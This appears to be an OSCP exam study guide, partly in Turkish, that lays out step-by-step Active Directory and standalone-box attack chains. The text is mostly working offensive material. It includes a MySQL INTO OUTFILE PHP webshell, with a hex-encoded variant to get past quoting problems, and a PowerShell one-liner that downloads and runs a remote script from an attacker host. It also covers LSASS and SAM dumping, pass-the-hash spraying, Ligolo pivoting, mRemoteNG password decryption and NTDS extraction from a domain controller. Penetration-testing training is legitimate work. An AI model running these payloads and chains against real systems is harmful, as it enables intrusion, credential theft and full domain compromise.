# 1. XAMPP → Domain Compromise: Full Attack Chain Methodology

Chronological, exam-ready reference for a foothold-to-DC chain that starts on a XAMPP/MySQL web server and ends in full domain compromise via credential reuse and pivoting.

---
# AD Set Version I
## 1. XAMPP Credential File Discovery

Foothold reached (LFI/RCE/creds already obtained) → hunt XAMPP's known-weak config/cred files first, they're near-guaranteed on default installs.

```bash
# Default XAMPP paths (Windows)
type C:\xampp\phpMyAdmin\config.inc.php
type C:\xampp\mysql\bin\my.ini
type C:\xampp\apache\conf\extra\httpd-xampp.conf
dir /s /b C:\xampp\htdocs\*.php | findstr /i "config db conn"
type C:\xampp\htdocs\*\config*.php
```

**Decision point:** hardcoded `$cfg['Servers'][$i]['user']` / `$cfg['Servers'][$i]['password']` found in `config.inc.php` → go to step 2 (MySQL credential reuse). If root has no password (XAMPP default `root:` empty) → skip straight to step 3.

---

## 2. MySQL Credential Reuse

Test recovered creds directly against MySQL — XAMPP MySQL is usually bound to 127.0.0.1 only, so this is normally done from the shell you already have, or tunneled.

```bash
mysql -h 127.0.0.1 -u root -p'<recovered_pw>' -e "SHOW DATABASES;"
mysql -h 127.0.0.1 -u <user> -p'<recovered_pw>' -e "SELECT user,authentication_string,host FROM mysql.user;"
```

**Decision point:** login succeeds and the account has `FILE` privilege (`SHOW GRANTS;`) → step 3. No `FILE` priv → look for other DB-based vectors (UDF injection if `plugin_dir` writable, or just loot data) instead.

---

## 3. MySQL `SELECT INTO OUTFILE` → Webshell

Abuse `FILE` privilege to drop a PHP webshell inside the web root.

```sql
-- confirm FILE priv and web root path first
SHOW VARIABLES LIKE 'secure_file_priv';
SELECT "<?php system($_REQUEST['cmd']); ?>" INTO OUTFILE 'C:/xampp/htdocs/shell.php';
```

```bash
# if secure_file_priv is empty or matches htdocs, this works directly
curl "http://<target>/shell.php?cmd=whoami"
```

**Decision point:** `secure_file_priv` is empty or set to a path containing the web root → outfile write succeeds. If it's set to a different restricted dir → try UDF (`lib_mysqludf_sys`) injection instead, or look for another writable/web-exposed path.

---

## 4. Webshell → SYSTEM RCE

XAMPP's Apache service on Windows almost always runs as `NT AUTHORITY\SYSTEM` by default — webshell RCE is frequently already SYSTEM, confirm before escalating further.

```bash
curl "http://<target>/shell.php?cmd=whoami"
curl "http://<target>/shell.php?cmd=whoami+/priv"
```

|Finding|Next move|
|---|---|
|`whoami` returns `nt authority\system`|already SYSTEM — skip to step 5 directly|
|Apache running as local service/user|standard Windows privesc methodology (services, tokens, AlwaysInstallElevated) before continuing chain|
|Need interactive shell instead of one-liners|upgrade via `nc.exe`/reverse shell or msfvenom staged payload through the webshell|

```bash
# upgrade to a stable reverse shell if needed
curl "http://<target>/shell.php?cmd=powershell+-c+IEX(New-Object+Net.WebClient).DownloadString('http://<lhost>/shell.ps1')"
```

---

## 5. LSASS Credential Dumping / Mimikatz

With SYSTEM, dump LSASS to recover plaintext creds / hashes for reuse elsewhere on the network.

```powershell
# via Mimikatz (upload first)
privilege::debug
sekurlsa::logonpasswords
lsadump::sam

# OR living-off-the-land dump for offline parsing
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\Windows\Temp\lsass.dmp full
```

```bash
# offline parse if dumped via comsvcs.dll (transfer lsass.dmp off-box first)
pypykatz lsa minidump lsass.dmp
```

**Decision point:** Defender/AV present → prefer `comsvcs.dll` dump + offline `pypykatz` parse over dropping Mimikatz binary. Note in your report which method was used and why (noise/AV consideration).

---

## 6. Credential Reuse / Password Spraying

Take every credential recovered so far (XAMPP config, LSASS) and spray it across discovered hosts/services.

```bash
netexec smb <target_range> -u <user> -p '<password>' --continue-on-success
netexec winrm <target_range> -u <user> -p '<password>'
crackmapexec smb <target_range> -u users.txt -p passwords.txt --continue-on-success
```

**Decision point:** hit on a new host → enumerate that host's shares/sessions before moving on; don't stop at first hit, log every host+account combo that authenticates.

---

## 7. Network Pivoting with Ligolo-ng

New internal network segment discovered from the compromised box (second NIC, ARP table, routing table) → pivot instead of running everything through the webshell.

```bash
# attacker side
./proxy -selfcert

# on compromised host (agent)
.\agent.exe -connect <attacker_ip>:11601 -ignore-cert
```

```bash
# in ligolo-ng console
session
ifconfig                          # confirm internal interface visible
route add 10.10.20.0/24 tun0      # add route to internal network on attacker
```

**Decision point:** additional NIC found in `ipconfig /all` with a different subnet on the compromised host → this is the pivot target range; rescan it (nmap/netexec) once the route is up.

---

## 8. mRemoteNG Stored Credential Extraction

Pivoted host or original box has mRemoteNG installed (common on admin jump boxes) → its saved connections file holds encrypted creds for other infrastructure.

```powershell
dir /s /b confCons.xml
type "$env:APPDATA\mRemoteNG\confCons.xml"
```

**Decision point:** `confCons.xml` found and contains `Password=` attributes → step 9. Not found → check `%APPDATA%\mRemoteNG\` more broadly for backup/export XML files.

---

## 9. mRemoteNG `confCons.xml` Password Decryption

mRemoteNG uses AES-128-CBC with a hardcoded default key ("mR3m") unless the user set a custom master password — try default first.

```bash
# mremoteng_decrypt (multiple tool options exist, e.g. from CiscoCXSecurity or kmahyyg fork)
python3 mremoteng_decrypt.py -s "<encrypted_password_blob>"
```

**Decision point:** decrypt succeeds with default key → creds recovered, go to step 6 pattern (reuse them) or continue chain. Fails → custom master password set; check `PowerShell PSReadLine history` (step 10) or other loot for the master password before giving up on this file.

---

## 10. PowerShell PSReadLine History Credential Leakage

Any host reached (original box, pivoted box, admin jump box) → PSReadLine logs every command typed interactively, frequently including plaintext creds from `net use`, `runas`, or manual `$cred` assignments.

```powershell
(Get-PSReadlineOption).HistorySavePath
type "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
findstr /i "password pwd runas net use" "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

**Decision point:** credentials or a mRemoteNG master password found in history → loop back to step 6 (credential reuse/spray) or step 9 (retry confCons.xml decryption with recovered master password).

---

## 11. SMB Share Enumeration

With every credential set gathered so far, sweep SMB shares across the domain for anything readable.

```bash
netexec smb <target_range> -u <user> -p '<password>' --shares
smbclient -L //<target>/ -U '<user>%<password>'
smbmap -H <target> -u <user> -p '<password>' -r
```

**Decision point:** non-default share found (not `ADMIN$`/`C$`/`IPC$`) → mount and recursively list it; prioritize shares named `Backup`, `IT`, `Scripts`, `Users`, `Software`.

---

## 12. Sensitive Backup File Discovery

Inside accessible shares (and locally on any host) — hunt for backup files that commonly contain registry hive dumps or config secrets.

```bash
smbclient //<target>/<share> -U '<user>%<password>' -c 'recurse ON; prompt OFF; mget *.bak *.old *.zip *.7z *.dmp *.reg'
```

```powershell
# locally on a host
Get-ChildItem -Recurse -Include *.bak,*.old,*.zip,*.7z,*.dmp,*.reg -ErrorAction SilentlyContinue C:\
```

**Decision point:** filenames matching `sam.bak`, `system.bak`, `ntds.dit`, or IT-admin-looking backup archives found → step 13. Generic app backups → grep contents for connection strings/passwords instead.

---

## 13. SAM + SYSTEM Hive Extraction

Either recovered directly from a backup (step 12) or extracted live from a host you have admin on.

```powershell
# live extraction (requires local admin)
reg save HKLM\SAM C:\Windows\Temp\sam.save
reg save HKLM\SYSTEM C:\Windows\Temp\system.save
reg save HKLM\SECURITY C:\Windows\Temp\security.save
```

```bash
# transfer sam.save/system.save/security.save to attacker box
```

**Decision point:** domain-joined host with cached domain creds needed → also grab `SECURITY` hive (holds LSA secrets/cached domain logons), not just SAM/SYSTEM.

---

## 14. Offline NTLM Hash Extraction with `secretsdump`

Parse the extracted (or backed-up) hives offline for NTLM hashes and LSA secrets.

```bash
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

**Decision point:** local `Administrator` hash recovered and reused across the fleet (common in unmanaged environments) → step 15. Domain account hash found in LSA secrets/cached creds → treat as domain credential, prioritize for step 15/16.

---

## 15. NTLM Credential Reuse / Pass-the-Hash

Take every NTLM hash recovered and spray/PtH across the environment — no cracking needed.

```bash
netexec smb <target_range> -u <user> -H '<ntlm_hash>' --continue-on-success
netexec smb <target_range> -u <user> -H '<ntlm_hash>' -x whoami
evil-winrm -i <target> -u <user> -H '<ntlm_hash>'
psexec.py <domain>/<user>@<target> -hashes ':<ntlm_hash>'
```

**Decision point:** hash authenticates on a host where a **domain admin or DC-adjacent account** has an active session or is a local admin equivalent → step 16. Only local admin on low-value boxes → keep spraying/enumerating for a domain-privileged hit before moving on.

---

## 16. Lateral Movement to Domain Controller

Credential/hash from step 15 grants access to a host with a path toward the DC (domain admin session, DCSync rights, or direct DC local admin).

```bash
# confirm DC reachability + identify DC
netexec smb <dc_ip> -u <user> -H '<ntlm_hash>'

# if domain admin hash/creds obtained
psexec.py <domain>/<domain_admin>@<dc_ip> -hashes ':<ntlm_hash>'
evil-winrm -i <dc_ip> -u <domain_admin> -H '<ntlm_hash>'

# if DCSync rights instead of direct admin
secretsdump.py <domain>/<user>@<dc_ip> -hashes ':<ntlm_hash>' -just-dc
```

**Decision point:** direct admin access to DC obtained → step 17. Only DCSync rights (no shell) → domain is already effectively compromised via `-just-dc` NTDS dump; shell access is optional at that point.

---

## 17. Domain Controller Privilege Escalation / Domain Compromise

Final confirmation and full domain credential extraction.

```bash
# dump the entire domain (NTDS.dit + hashes for every domain account)
secretsdump.py <domain>/<domain_admin>@<dc_ip> -hashes ':<ntlm_hash>'

# confirm SYSTEM/domain admin on DC interactively
whoami
whoami /groups
```

Domain compromised once `krbtgt` hash and all domain-user NTLM hashes are dumped — this also enables Golden Ticket persistence if in scope.

---

## Priority Fast-Path Summary (try these first)

1. **XAMPP config.inc.php → MySQL FILE priv → webshell** — this is almost always the intended foothold-to-execution vector when XAMPP is present; check it before anything else.
2. **Webshell = SYSTEM check immediately** — don't waste time on Windows privesc methodology until you've confirmed you're not already SYSTEM via the Apache service account.
3. **PSReadLine history on every host you land on** — highest signal-to-effort credential source, check it before deep-diving any other loot vector.
4. **mRemoteNG confCons.xml with default key** — near-instant win if the file exists and no custom master password was set.
5. **SAM/SYSTEM extraction → secretsdump → PtH spray** — the reliable fallback path to lateral movement even if no plaintext creds are ever found.
6. **DCSync rights check as soon as any domain account is compromised** — often faster to full domain compromise than chasing a direct DA session.

---

# 2. Standalone 1

## Full Path Reconstruction

Notların gayet tutarlı, birkaç belirsiz nokta var ama mantık zinciri net kuruluyor. Adım adım, her adımda "neden bu adım" ve "sonraki adıma nasıl karar verildi" ile birlikte:

### 1. Nmap taraması

`nmap -sC -sV <IP>` sonucu **110 (POP3)** ve **43 (WHOIS)** açık çıkmış.

- **Karar noktası:** 43 nadir görülen bir port — standart bir servis değil, muhtemelen custom yazılmış/vuln bir whois implementasyonu. Önce burayı incelemek mantıklı, çünkü WHOIS genelde OSCP box'larında bilgi sızdırmak için kurulur.

### 2. WHOIS sorgusu (nc ile)

```
echo "oscp.exam" | nc <IP> 43
```

WHOIS protokolü ham TCP üzerinden çalışır (WHOIS client'a gerek yok), bir domain/query string gönderirsin, sunucu ham text döner.

- **Muhtemel sonuç:** Dönen kayıtta bir admin/registrant contact alanı içinde bir **username** sızmış (örn. "Admin Contact: sysadmin" gibi).
- **Sonraki adıma karar:** Elde edilen isim bir login denemesi için aday.

### 3. İlk login denemesi — username:username

Notundaki "probably tried username:username" kısmı senin **kendi tahminin**, muhtemelen zafiyetli/zayıf parola pattern'ini test etmek için klasik bir refleks (aynı string hem user hem pass). Muhtemelen bu **başarısız** oldu, çünkü bir sonraki satırda farklı bir credential (`sysadmin:sysadmin`) ile devam ediyorsun.

### 4. sysadmin:sysadmin — başarılı login

Bu kombinasyon muhtemelen **POP3 (110)** üzerinde denendi, çünkü akışta hemen ardından `RETR` komutu geliyor ki bu saf bir POP3 komutu (mail sunucusu dışında bir yerde anlamı yok).

```
telnet <IP> 110
USER sysadmin
PASS sysadmin
LIST
RETR 1
```

- **Karar noktası:** POP3'e login olduysan sıradaki hamle her zaman mailbox içeriğini çekmektir — `RETR <msg_id>`.

### 5. RETR ile mail içeriği çekildi

Mail içeriğinde muhtemelen **SSH için başka bir credential seti** (username + password, ya da bir private key) bulunmuş.

### 6. SSH ile login

Yeni credential'la SSH bağlantısı kuruldu → `local.txt` alındı (user-level flag).

### 7. Sudo version kontrolü

```
sudo -V
```

veya `sudo --version`. Çıkan versiyon **bilinen bir CVE'ye** denk geliyor. Not'ta hangi CVE yazmamışsın ama versiyona göre en olası adaylar:

- **CVE-2021-3156** (Baron Samedit) — sudo < 1.9.5p2, heap overflow
- **CVE-2019-18634** — `pwfeedback` aktifse, sudo < 1.8.31
- **CVE-2023-22809** — sudoedit ile dosya izinleri bypass

Hangisi olduğunu anlamanın yolu: `sudo -V` çıktısındaki tam versiyon numarasını GTFOBins/exploit-db'de aratmak.

### 8. Privesc → proof.txt

CVE exploit edilip root alındı, `proof.txt` okundu.

---

**Özet decision-tree:**

```
nmap → 110, 43 açık
  └─ 43 garip → nc ile whois sorgusu at
        └─ username sızdı
              └─ username:username dene (fail)
                    └─ sysadmin:sysadmin dene (110'da) → başarılı
                          └─ RETR ile mail oku → yeni cred bul
                                └─ SSH login → local.txt
                                      └─ sudo -V → CVE tespit → exploit → root → proof.txt
```

---
# 2. Standalone 2

## Full Path Reconstruction

Bu path SMB üzerinden bilgi sızıntısı + Windows'a özgü bir mekanizma (`MUST_CHANGE`) üzerine kurulu. Notlarındaki iki belirsiz nokta (`MUST_CHANGE` ve `-M change_password`) aslında birbirine bağlı — açıklayınca path kendiliğinden oturuyor.

### 1. Nmap → SMB tespiti

445 (ve muhtemelen 139) açık → SMB servisi var.

### 2. SMB Null Session

```
smbclient -N -L //<IP>/
```

veya

```
crackmapexec smb <IP> -u '' -p ''
```

Anonim/null session'ın kabul edilmesi, sunucunun yanlış yapılandırıldığının işareti — bir sonraki adım her zaman enumeration'dır.

### 3. Kullanıcı listesi çekme

`nxc` (NetExec) ile:

```
nxc smb <IP> -u '' -p '' --users
```

**Diğer yöntemler** (senin sorduğun kısım):

- `rpcclient -U "" -N <IP>` → içeride `enumdomusers`
- `enum4linux -U <IP>` veya `enum4linux-ng -U <IP>`
- `smbmap -u '' -p '' -H <IP>` (daha çok share listelemek için ama bazen user bilgisi de verir)
- LDAP açıksa: `ldapsearch` ile de kullanıcı+description çekilebilir

### 4. Description alanında credential

Windows'ta AD kullanıcı objesinin "description" alanı serbest metin — sistem yöneticileri bazen parolayı buraya not düşer (kötü pratik ama OSCP'de klasik bir vuln). `nxc --users` veya `rpcclient`'daki `queryuser` çıktısında bu alan görünür.

### 5. `MUST_CHANGE` ne demek?

Bu **`whoami /all` değil** — bu bir **hesap flag'i** (UAC flag). SAMR/LDAP üzerinden dönen kullanıcı bilgisinde `acb_info` içinde `MUST_CHANGE_PASSWORD` (ya da nxc çıktısında sadece `PW_NOTREQD`, `MUST_CHANGE` gibi kısaltmalarla) görünür. Anlamı: **bu hesabın parolası "geçici"** — bir sonraki login'de değiştirilmesi zorunlu. Yani description'da bulduğun parola muhtemelen **ilk/geçici parola**, doğrudan SMB/WinRM login'de kabul edilmiyor çünkü sistem "önce değiştir" diyor.

**Nasıl görürsün:** `nxc smb <IP> -u <user> -p <pass>` çalıştırdığında hata mesajında `STATUS_PASSWORD_MUST_CHANGE` görürsün. Bu senin path'inde muhtemelen olan şey.

### 6. `-M change_password` ne demek?

Bu, **nxc'nin (NetExec) bir modülü**. `STATUS_PASSWORD_MUST_CHANGE` hatasını aldığında parolayı SMB/SAMR protokolü üzerinden **interactive login olmadan** değiştirmene izin verir:

```
nxc smb <IP> -u <user> -p '<eski_parola>' -M change_password -o NEWPASS='<yeni_parola>'
```

Bu, SMB oturumu açılmadan (login yapılmadan) SAMR protokolü ile parola değiştirme isteği gönderir — Windows bunu "ilk parola değişimi" akışı olarak kabul eder.

### 7. WinRM ile bağlanma

Yeni parola ile:

```
evil-winrm -i <IP> -u <user> -p '<yeni_parola>'
```

→ `local.txt` alınır.

**Senin sorun: "Ya kullanıcı Remote Management Group'ta değilse / WinRM yoksa?"**

Bu gayet geçerli bir senaryo, alternatifler:

- **SMB üzerinden dosya erişimi** — eğer hesabın bir share'e (özellikle `C$` veya kullanıcı share'i) yazma/okuma izni varsa, `smbclient` veya `psexec.py` (impacket) ile shell almayı dene
- **Impacket araçları** — `psexec.py`, `wmiexec.py`, `atexec.py` — bunlar WinRM değil, SMB/DCOM/Task Scheduler üzerinden çalışır, RM group gerektirmez, sadece admin/uygun yetki ister
- **RDP (3389 açıksa)** — `xfreerdp` ile GUI erişim
- Hesap sadece **düşük yetkili bir standart kullanıcıysa** ve hiçbir remote execution yolu yoksa → SMB share'lerini (`smbmap -u ... -p ...`) tekrar tara, bu sefer authenticated olarak, çünkü yetkili bir kullanıcı daha fazla share görebilir

### 8. Priv esc kısmı (senin notunda eksik)

`local.txt` sonrası hiçbir şey yazmamışsın — bu normal, senin notların oraya kadar. Eğer bu makineyi tekrar çözersen, tipik sıradaki adımlar:

- `winPEAS` veya `PowerUp.ps1` çalıştırmak
- `whoami /priv` ile ayrıcalık kontrolü (SeImpersonate, SeBackup vs.)
- AlwaysInstallElevated, unquoted service path, weak service permissions kontrolü

---

**Özet decision-tree:**

```
nmap → SMB (445) açık
  └─ null session çalışıyor mu? → evet
        └─ user enum (nxc/rpcclient/enum4linux)
              └─ description'da parola var mı? → evet
                    └─ login dene → STATUS_PASSWORD_MUST_CHANGE hatası
                          └─ nxc -M change_password ile parolayı değiştir
                                └─ WinRM var mı?
                                      ├─ evet → evil-winrm → local.txt
                                      └─ hayır → impacket (psexec/wmiexec) veya smbmap ile share erişimi dene
```

# AD Set Version II

## Full Path Reconstruction — AD Set (Detaylı)

Bu senin gördüğüm en karmaşık path'in, özellikle MySQL→RCE ve mRemoteNG kısımları OSCP'de klasik ama detayı çok kaçırılan noktalar. Adım adım, her belirsiz noktayı netleştirerek gidiyorum.

---

### AŞAMA 1: İlk Foothold ile Enumeration

**"ilk cred -> users, shares -> extract smb"**

Bir yerden (muhtemelen önceki bir kutu/leak/başka bir path) ele geçirdiğin credential ile:

```
nxc smb <IP> -u <user> -p <pass> --users
nxc smb <IP> -u <user> -p <pass> --shares
```

**"extract smb"** — evet, tahminin doğru, bu bir dosya adı/işlemi değil, muhtemelen bulduğun bir share'e bağlanıp içeriği çekme işlemi:

```
smbclient //<IP>/<share> -U <user>
smbmap -u <user> -p <pass> -H <IP> -R
```

- **Karar noktası:** Share içinde ilginç bir klasör/dosya var mı diye bakılır — burada **XAMPP** klasörüne rastlanmış.

---

### AŞAMA 2: XAMPP Keşfi

**"XAMPP -> passwords.txt -> ?"**

XAMPP kurulumlarında varsayılan olarak `\xampp\passwords.txt` dosyası bulunur (bazı sürümlerde silinmemiş olur). İçeriği genelde şöyledir:

```
MySQL:
  User: root
  Password: (boş veya default)
phpMyAdmin:
  User: ...
FileZilla FTP:
  ...
```

**Buradan çıkan şey:** Muhtemelen **MySQL root** credential'ı (çoğu zaman şifre boş bırakılmış olur ya da zayıf bir default). Bu, bir sonraki adımın (MySQL bağlantısı) anahtarı.

---

### AŞAMA 3: MySQL → RCE (En kritik kısım)

**"XAMPP -> htdocs (?) -> /bin -> OUTFILE (shell yazma) -> shell -> HEX encode -> upload shell -> NT/AUTH"**

Bu adım aslında şu mantıkla işliyor, sırasıyla düzelteyim:

**3.1 — `/bin` neden kullanıldı:**  
XAMPP'ın kendi MySQL client binary'si `xampp\mysql\bin\mysql.exe` yolunda bulunur. Eğer bir shell erişimin varsa (ya da RCE öncesi bir yerden CLI çalıştırabiliyorsan) bunu kullanarak hedef MySQL sunucusuna bağlanırsın:

```
mysql.exe -u root -p<pass> -h <target_ip>
```

Eğer henüz shell'in yoksa ve dışarıdan bağlanıyorsan, kendi makinende kurulu `mysql` client'ı ile de bağlanabilirsin — `/bin` şart değil, sadece o an elindeki yol o.

**3.2 — `htdocs` neden önemli:**  
XAMPP'ta web root'u `C:\xampp\htdocs\` şeklindedir. MySQL'in `FILE` yetkisi varsa (root genelde vardır), `SELECT ... INTO OUTFILE` ile **web root'a doğrudan dosya yazabilirsin** — yazdığın dosya tarayıcıdan erişilebilir olur.

**3.3 — OUTFILE ile webshell yazma:**

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "C:/xampp/htdocs/shell.php";
```

Ama gerçek hayatta bu direkt çalışmaz — çünkü çift tırnak/tek tırnak karakterleri MySQL query parser'ı ile PHP syntax'ı çakışabilir, ayrıca bazı MySQL konfigürasyonlarında string literal içinde ters slash/tırnak escape sorunları çıkar.

**3.4 — HEX encode neden gerekli (senin sorduğun kısım):**  
İşte tam burası — **quote/escape sorunlarını tamamen bypass etmek için** payload'ı hex literal olarak yazarsın. MySQL'de `0x...` formatındaki bir hex string, tırnak kullanmadan bir binary/string değeri temsil eder:

```sql
SELECT 0x3c3f70687020737973 -- (hex encoded "<?php syst..." vs.)
INTO OUTFILE "C:/xampp/htdocs/shell.php";
```

PHP payload'ını hex'e çevirmek için:

```bash
echo -n '<?php system($_GET["cmd"]); ?>' | xxd -p | tr -d '\n'
```

Çıkan hex'in başına `0x` ekleyip query'de kullanırsın. Bu sayede **hiçbir tırnak/özel karakter query'yi bozmaz**.

**3.5 — upload shell / erişim:**  
Dosya `htdocs`'a yazıldıktan sonra tarayıcıdan:

```
http://<IP>/shell.php?cmd=whoami
```

ile RCE elde edilir.

**3.6 — NT/AUTH privileges:**  
XAMPP'ın Apache servisi genelde **NT AUTHORITY\SYSTEM** veya **NT AUTHORITY\NETWORK SERVICE** hesabıyla çalışır (kurulum şekline göre değişir — XAMPP'ı servis olarak kurduysan çoğunlukla SYSTEM olur, bu da OSCP'de bu path'in bu kadar popüler olmasının sebebi: **RCE = anında SYSTEM**).  
→ `local.txt` (user.txt senin notunda ama SYSTEM aldıysan zaten üstsün) alınır.

---

### AŞAMA 4: Pivot ve Credential Harvesting

**Ligolo-ng ile pivot:**

```
# Attacker tarafında proxy başlat
./proxy -selfcert
# Hedefte agent çalıştır
./agent -connect <attacker_ip>:11601 -ignore-cert
```

Bu sana ele geçirdiğin makine üzerinden **ikinci ağa (internal network) tünel** açar.

**Mimikatz ile hash toplama:**

```
privilege::debug
sekurlsa::logonpasswords
```

**Hangi hash'ler en değerli, nasıl anlarsın:**

- **Domain Admin veya yüksek yetkili bir domain hesabının NTLM hash'i** en değerlidir — `sekurlsa::logonpasswords` çıktısında `Domain :` alanı makinenin kendi adı değil, **AD domain adı** ise ve `User :` alanı Administrator/DA grubunda biriyse bu altın değerinde.
- Yerel hesap hash'leri (`Domain: <makine adı>`) sadece o makine için ya da aynı parolayı paylaşan başka makineler için işe yarar (pass-the-hash spray).
- **krbtgt hash'i** görürsen bu bambaşka bir seviye (Golden Ticket potansiyeli) ama bu genelde DC'de bulunur, ilk foothold makinesinde değil.

**Tüm hash'leri tek seferde almak için one-liner:**

```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" "lsadump::sam" "exit"
```

veya offline/uzaktan (creds varsa) impacket ile:

```bash
secretsdump.py <domain>/<user>:<pass>@<IP>
```

bu tek komutla hem SAM hem LSA secrets hem de (DC ise) NTDS.dit hash'lerini döker.

---

### AŞAMA 5: İkinci Makine

**"spray -> foothold -> All Users"**

Elde ettiğin hash(ler) ile pivot ettiğin ağdaki diğer makinelere spray:

```
nxc smb <ip_range> -u <user> -H <hash>
```

Başarılı olan makineye giriş sağlanır (foothold).

**"All Users" ne demek:**  
Bu muhtemelen `whoami /all` **değil** — Windows'ta `C:\Users\` klasörünü listelemek:

```
dir C:\Users\
```

Amaç: **bu makinede kaç kullanıcı profili var, kimin dosyalarına erişebiliyorum** sorusuna cevap bulmak. Burada başka bir kullanıcının (muhtemelen admin/IT personeli) profilinde ilginç bir uygulama klasörüne rastlanmış: **mRemoteNG**.

---

### AŞAMA 6: mRemoteNG → Credential Decrypt

**mRemoteNG nedir:** Açık kaynak bir **remote connection manager** — RDP, SSH, VNC gibi bağlantı bilgilerini (host, kullanıcı adı, **şifrelenmiş parola**) tek yerde saklayan bir araç. IT personeli/sysadmin'ler sıkça kullanır, bu yüzden OSCP kutularında (ve gerçek dünyada) bulunması büyük bir bulgu sayılır.

**config.xml:** Gerçek dosya adı genelde `confCons.xml`, şu yolda bulunur:

```
C:\Users\<user>\AppData\Roaming\mRemoteNG\confCons.xml
```

İçinde her bağlantı için `Password="..."` alanı **AES ile şifrelenmiş** olarak durur.

**Decrypt (py):**  
Evet, tahminin doğru — bu decrypt işlemi için topluluk tarafından yazılmış Python scriptleri var (GitHub'da "mremoteng_decrypt" adıyla aranabilir, birkaç farklı yazar tarafından yapılmış versiyonları mevcut). Script şunu yapar:

- confCons.xml'deki encrypted password field'ı alır
- Eski mRemoteNG sürümlerinde **sabit bir key** kullanılır (bu yüzden decrypt mümkün); yeni sürümlerde bir "master password" olabilir ama çoğu OSCP kutusu eski/varsayılan config kullanır

```bash
python3 mremoteng_decrypt.py -s <encrypted_password_string>
```

Çıktı: plaintext parola.

**password -> proof.txt:** Bu parolayla (muhtemelen farklı/daha yetkili bir kullanıcı olarak) login olunur, ikinci flag (`proof.txt`) alınır. Doğru tahmin ettin.

---

### AŞAMA 7: Post-Exploitation — PowerShell History

**"mimikatz -> powershell history, PSReadLine"**

**PSReadLine nedir:** PowerShell'in komut geçmişini tutan modül. Kullanıcının yazdığı **her komut** (parolalar dahil, eğer biri hata yapıp komut satırına düz parola yazdıysa) diske kaydedilir.

**Nerede ve nasıl okunur:**

```powershell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

veya tam yol:

```
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**WinPEAS yakalıyor mu:** Evet — WinPEAS'in "Interesting Files" / "PowerShell" bölümünde bu dosyayı otomatik tarar ve içinde `password`, `pass`, `-p` gibi pattern'ler varsa vurgulayarak gösterir. Ama yine de manuel kontrol etmekte fayda var, WinPEAS her zaman her şeyi yakalamaz.

---

### AŞAMA 8: SMB Share → SAM/SYSTEM → secretsdump

**"smb shares -> secretsdump (neyle?) -> SAM SYSTEM"**

Tahminin doğru — bir share üzerinde (ya da erişimin olan bir dizinde) **SAM ve SYSTEM registry hive'larının backup'ı** bulunmuş olmalı (bazı adminler `reg save` ile yedek alıp paylaşımda bırakır, ya da bir backup script'inin kalıntısı). Bu dosyaları çektikten sonra:

```bash
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

Bu, offline olarak local hash'leri (SAM) çıkarır. Eğer hedefe network üzerinden direkt admin credential ile erişimin varsa, dosyaları çekmeden de direkt:

```bash
secretsdump.py <domain>/<user>:<pass>@<IP>
```

ile aynı sonucu (uzaktan) alabilirsin.

---

### AŞAMA 9: DC'ye Geçiş

**"3. Adımın ... -> DC"**

Okunamayan notun muhtemel anlamı: **ilk credential ile ulaşılan SMB share'e geri dönüp**, buradan (ya da bu noktaya kadar toplanan hash/credential zincirinden) **Domain Admin yetkisine ulaşan bir hash/parola** kullanılarak DC'ye erişim sağlanmış olması. Tipik senaryo:

- secretsdump ile elde edilen bir hash, aslında **Domain Admin grubundaki bir hesabın hash'i** çıkar (cached credential ya da reused password)
- Bu hash ile direkt DC'ye:

```bash
secretsdump.py <domain>/<DA_user>@<DC_IP> -hashes :<NTLM_hash>
```

ya da

```bash
evil-winrm -i <DC_IP> -u <DA_user> -H <NTLM_hash>
```

→ DC compromise, `NTDS.dit` dump edilerek tüm domain hash'leri alınır (DCSync de bir alternatif: `secretsdump.py <domain>/<DA_user>:<pass>@<DC_IP>` otomatik DCSync dener).

---

## Özet Decision-Tree

```
İlk cred → users/shares enum → XAMPP klasörü bulundu
  └─ passwords.txt → MySQL root cred
        └─ mysql client ile bağlan → FILE yetkisi var mı? → evet
              └─ OUTFILE ile htdocs'a shell yaz (hex encode: quote sorunlarını bypass için)
                    └─ browser'dan shell'e eriş → RCE (genelde SYSTEM/NETWORK SERVICE)
                          └─ local.txt
                                └─ ligolo ile pivot ağı aç
                                      └─ mimikatz → en değerli hash = domain hesabı hash'i
                                            └─ spray → 2. makinede foothold
                                                  └─ C:\Users\ tara → başka profil bul
                                                        └─ mRemoteNG confCons.xml bul
                                                              └─ python script ile decrypt → parola
                                                                    └─ proof.txt (2. flag)
                                                                          └─ PSReadLine history oku → ekstra cred?
                                                                                └─ SMB share'de SAM/SYSTEM bul
                                                                                      └─ secretsdump (offline ya da uzaktan)
                                                                                            └─ DA hash/cred bulundu
                                                                                                  └─ DC'ye login → NTDS.dit → tam domain compromise
```

Elinde gerçek komut çıktıları (özellikle mimikatz ve mRemoteNG decrypt kısmı) varsa, hangi script/argümanların kullanıldığını daha kesin doğrulayabiliriz.